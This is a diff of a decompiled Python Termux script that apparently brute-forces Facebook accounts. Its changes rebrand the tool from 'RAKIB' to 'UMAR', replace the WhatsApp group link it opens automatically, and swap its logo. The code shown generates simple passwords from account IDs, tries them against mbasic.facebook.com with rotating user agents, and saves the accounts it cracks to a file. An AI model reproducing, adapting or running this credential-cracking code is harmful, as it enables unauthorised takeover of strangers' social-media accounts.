@@ -2,9 +2,9 @@
 # Time Succes decompile : 2023-09-08 23:37:15.296896
 
 import os
-print("\033[1;92m [•] LX RAKIB BOSS - SYSTEM INSTALL. . . . \033[1;30m")
+print("\033[1;92m [•] LX UMAR BOSS - SYSTEM INSTALL. . . . \033[1;30m")
 os.system("pkg install espeak")
-print("\033[1;92m   [•] LX RAKIB BOSS - INSTALL COMPLETE \033[1;30m")
+print("\033[1;92m   [•] LX UMAR BOSS - INSTALL COMPLETE \033[1;30m")
 os.system('espeak -a 300 "SAZZAD . TOOLS. install complete"')
 print("\033[1;92m   [•] UPDATE CHECKING \033[1;30m")
 os.system('espeak -a 300 "WAITING FOR UPDATE"')
@@ -92,14 +92,24 @@ for x in range(999):
 	E = f' Mobile Safari/537.36'
 	F = f'{A}{C}{D}{E}'
 os.system("clear")
-os.system('xdg-open https://chat.whatsapp.com/HNvBHDP6FOPCg3BVwlpvrC')
+os.system('xdg-open https://chat.whatsapp.com/LEwEq6tHVjM7wnW33DNfQb')
 os.system('espeak -a 300 "Walcome To"')
-os.system('speak -a 300 "DX RAKIB KING .Tools"')
+os.system('speak -a 300 "DX UMAR KING .Tools"')
 logo = ("""\33[;33m   
          
-\033[92m╔═════════════════════════🇧🇩════════════════════════╗
-
-\033[1;32m╚═════════════════════════\033[38;5;196m〄\033[1;32m════════════════════════╝
+\033[92m
+  ______             __                           
+ /      \           /  |                          
+/$$$$$$  | __    __ $$ |____    ______    ______  
+$$ |  $$/ /  |  /  |$$      \  /      \  /      \ 
+$$ |      $$ |  $$ |$$$$$$$  |/$$$$$$  |/$$$$$$  |
+$$ |   __ $$ |  $$ |$$ |  $$ |$$    $$ |$$ |  $$/ 
+$$ \__/  |$$ \__$$ |$$ |__$$ |$$$$$$$$/ $$ |      
+$$    $$/ $$    $$ |$$    $$/ $$       |$$ |      
+ $$$$$$/   $$$$$$$ |$$$$$$$/   $$$$$$$/ $$/       
+          /  \__$$ |                              
+          $$    $$/                               
+           $$$$$$/                                
 
 \033[1;97m""")
 
@@ -200,7 +210,7 @@ def gml():
             pwx = [kode,kodex,kode+kodex,kode+'@123',kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
             yaari.submit(rcrack1,uid,pwx,tl)
     print(' [+] Crack process has been completed')
-    print(' [+] Ids saved in LX RAKIB BOSS-ok.txt')
+    print(' [+] Ids saved in LX UMAR BOSS-ok.txt')
 def rcrack1(uid,pwx,tl):
     global loop
     global cps
@@ -210,7 +220,7 @@ def rcrack1(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write('\r[\033[1;36m[RAKIB KING[🕓]\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] \r'%(loop,tl,len(oks))),
+            sys.stdout.write('\r[\033[1;36m[UMAR KING[🕓]\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] \r'%(loop,tl,len(oks))),
             sys.stdout.flush()
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
